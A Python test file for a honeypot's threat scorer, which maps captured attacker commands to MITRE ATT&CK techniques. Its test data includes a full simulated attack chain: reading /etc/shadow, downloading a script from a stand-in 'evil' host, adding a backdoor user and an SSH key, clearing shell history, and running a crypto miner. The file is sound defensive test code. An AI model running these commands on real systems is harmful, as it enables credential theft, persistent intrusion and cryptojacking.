"""Tests for :func:`anglerfish.threat.score_session`."""

from __future__ import annotations

from datetime import UTC, datetime
from uuid import uuid4

from anglerfish.models.session import CommandTurn, ResponseSource, SessionSnapshot
from anglerfish.threat.scorer import score_session
from anglerfish.threat.techniques import TechniqueRule


def _snapshot(*commands: str) -> SessionSnapshot:
    base_ts = datetime(2026, 5, 22, tzinfo=UTC)
    turns = tuple(
        CommandTurn(
            command=c,
            response="",
            source=ResponseSource.AI,
            timestamp=base_ts,
            latency_ms=1.0,
        )
        for c in commands
    )
    return SessionSnapshot(
        session_id=uuid4(),
        source_ip="203.0.113.7",
        username="root",
        fake_hostname="srv-prod-01",
        fake_username="root",
        fake_cwd="/root",
        started_at=base_ts,
        last_activity_at=base_ts,
        turns=turns,
    )


def test_empty_session_scores_zero() -> None:
    a = score_session(_snapshot())
    assert a.score == 0
    assert a.techniques == ()
    assert a.persistence_attempted is False
    assert a.high_severity is False


def test_benign_session_scores_low() -> None:
    a = score_session(_snapshot("ls", "pwd", "whoami"))
    assert a.score < 30
    # whoami, ls present
    ids = {t.id for t in a.techniques}
    assert "T1033" in ids
    assert "T1083" in ids


def test_repeated_command_counted_once_per_technique() -> None:
    a = score_session(_snapshot(*(["ls"] * 50)))
    # Only T1083 should match. Weight 2 + volume bonus.
    ids = {t.id for t in a.techniques}
    assert ids == {"T1083"}
    assert a.score < 30


def test_persistence_triggers_bonus_and_high_severity() -> None:
    a = score_session(_snapshot("useradd -m attacker", "ls"))
    assert a.persistence_attempted is True
    assert a.high_severity is True
    # T1136 weight 9 + T1083 weight 2 + volume 0 + persistence bonus 20 = 31
    assert a.score >= 30


def test_credential_dump_scores_high() -> None:
    a = score_session(_snapshot("cat /etc/shadow"))
    ids = {t.id for t in a.techniques}
    assert "T1003" in ids
    assert a.score >= 10


def test_full_attacker_kit_caps_at_100() -> None:
    commands = [
        "whoami",
        "id",
        "uname -a",
        "ip addr show",
        "ss -tlnp",
        "ps auxf",
        "nmap -sV 10.0.0.0/24",
        "cat /etc/shadow",
        "wget http://evil/x.sh",
        "crontab -e",
        "useradd -m attacker",
        "echo 'ssh-rsa AAAA' >> /root/.ssh/authorized_keys",
        "systemctl enable evil.service",
        "history -c",
        "./xmrig --pool stratum+tcp://x:1",
    ]
    a = score_session(_snapshot(*commands))
    assert a.score == 100
    assert a.persistence_attempted is True


def test_notes_include_persistence_when_relevant() -> None:
    a = score_session(_snapshot("useradd -m a"))
    assert any("Persistence" in n for n in a.notes)


def test_notes_include_no_match_when_no_techniques() -> None:
    a = score_session(_snapshot("supersecrettool --silent"))
    assert any("No MITRE" in n for n in a.notes)


def test_volume_bonus_caps() -> None:
    a = score_session(_snapshot(*(["ls"] * 1000)))
    # ls is T1083 weight 2. Volume bonus capped at 15. Total ≤ 17.
    assert a.score <= 17


def test_custom_rule_set_used_when_passed() -> None:
    custom = (
        TechniqueRule(
            id="X1",
            name="custom-x",
            description="custom",
            commands=("whoami",),
            weight=50,
        ),
    )
    a = score_session(_snapshot("whoami"), rules=custom)
    ids = {t.id for t in a.techniques}
    assert ids == {"X1"}
    assert a.score >= 50


def test_techniques_sorted_by_id() -> None:
    a = score_session(_snapshot("whoami", "useradd -m x", "cat /etc/shadow"))
    ids = [t.id for t in a.techniques]
    assert ids == sorted(ids)


def test_matches_truncated_to_ten() -> None:
    cmds = [f"ls /path-{i}" for i in range(30)]
    a = score_session(_snapshot(*cmds))
    ls_tech = next(t for t in a.techniques if t.id == "T1083")
    # All 30 ls commands are distinct, capped to 10.
    assert len(ls_tech.matches) == 10
